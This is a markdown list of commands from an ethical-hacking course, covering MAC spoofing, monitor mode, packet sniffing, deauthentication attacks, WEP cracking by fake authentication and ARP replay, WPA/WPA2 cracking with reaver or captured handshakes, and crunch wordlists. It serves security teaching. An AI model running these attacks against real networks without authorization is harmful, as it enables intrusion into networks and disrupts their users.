# Learn Ethical Hacking From Scratch with Zaid Sabih
Here are the commands that will be used in the course
## Network
### Change MAC Address
* Get the interface down
  * `ifconfig wlan0 down`
* Use macchanger
  * `macchanger --random wlan0`
* Get the interface up
  * `ifconfig wlan0 up`
### Change Wireless Card Mode
#### Method 1
* Start Monitor Mode
  * `airmon-ng start wlan0`
* Stop Monitor Mode
  * `airmon-ng stop wlan0mon`
#### Method 2
* Get the interface down
  * `ifconfig wlan0 down`
* Change Mode
  * `ifconfig wlan0 mode monitor`
* Get the interface up
  * `ifconfig wlan0 up`
#### Method 3
* Get the interface down
  * `ifconfig wlan0 down`
* Kill Process
  * `airmon-ng check kill`
* Start Monitor Mode
  * `airmon-ng start wlan0`
### Packet Sniffing
* Start Sniffing
  * `airodump-ng wlan0mon`
* Sniff In A Specific Network
  * `airodump-ng --channel <network channel> --bssid <network bssid> --write <file-name> wlan0mon`
* Deauth Attacks
  * `aireplay-ng --deauth <num-of-packets> -a <network bssid> -c <target bssid> wlan0mon`
### Crack WEP
#### Busy Network
* Start airodump-ng in the target
* Crack
  * `aircrack-ng <network-file>`
#### NOT Busy Network
* Fake Auth
  * `aireplay-ng --fakeauth 0 -a <network bssid> -h <your bssid || MAC> wlan0mon`
* Packet Injection
  * `aireplay-ng --arpreplay -b <network bssid> -h <your bssid || MAC> wlan0mon`
### Crack WPA/WPA2
#### With WPS
* Check if the network has WPS
  * `wash -i wlan0mon`
* Attack
  * `reaver -b <network bssid> -c <network channel> -i wlan0mon`
#### Without WPS
* Start airodump-ng in the target
* Deauth a client to capture the WPA Hanshake
* Crack the Key
  * `aircrack-ng <handshake-file> -w <word-list>`
#### Create a Wordlist
`crunch <min-length> <max-length> <characters> -o <file-name> -t <pattern>`
